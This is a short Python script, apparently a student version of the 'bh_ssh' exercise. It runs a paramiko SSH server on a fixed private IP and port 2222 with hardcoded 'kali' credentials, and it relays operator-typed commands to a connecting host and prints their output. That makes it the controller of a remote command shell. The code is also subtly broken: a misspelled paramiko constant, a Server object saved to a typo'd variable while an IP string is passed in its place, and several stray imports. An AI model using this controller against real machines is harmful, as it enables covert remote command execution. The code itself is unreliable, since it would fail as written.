from audioop import add
from distutils.cmd import Command
from http import client
import os
from time import pthread_getcpuclockid
import paramiko
import socket
import sys
import threading

CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))

class Server (paramiko.ServerInterface):
    def __init__(self) -> None:
        self.event = threading.Event()

    def check_channel_request(self, kind: str, chanid: int) -> int:
        if kind == 'session':
            return paramiko.OPEN_SUCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username: str, password: str) -> int:
        if (username == 'kali') and (password == 'kali'):
            return paramiko.AUTH_SUCCESSFUL

if __name__ == '__main__':
    server = '192.168.174.132'
    ssh_port = 2222
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print('[+] Listening for connection ...')
        client, addr = sock.accept()
    except Exception as e:
        print('[-] Listen failed: ' + str(e))
        sys.exit(1)
    else:
        print('[+]  Got a connection!', client, addr)

    print("Client: ", client)
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(HOSTKEY)
    sever = Server()
    bhSession.start_server(server=server)

    chan = bhSession.accept(20)
    if chan is None:
        print('*** No chanell.')
        sys.exit(1)
    
    print('[+] Authenticated!')
    print(chan.recv(1024))

    chan.send('Welcome to bh_ssh')
    try:
        while True:
            command = input('Enter command: ')
            if command != 'exit':
                chan.send(command)
                r = chan.recv(8192)
                print(r.decode()) 
            else:
                chan.send('exit')
                print('exiting')
                bhSession.close()
                break
    except KeyboardInterrupt:
        bhSession.close()
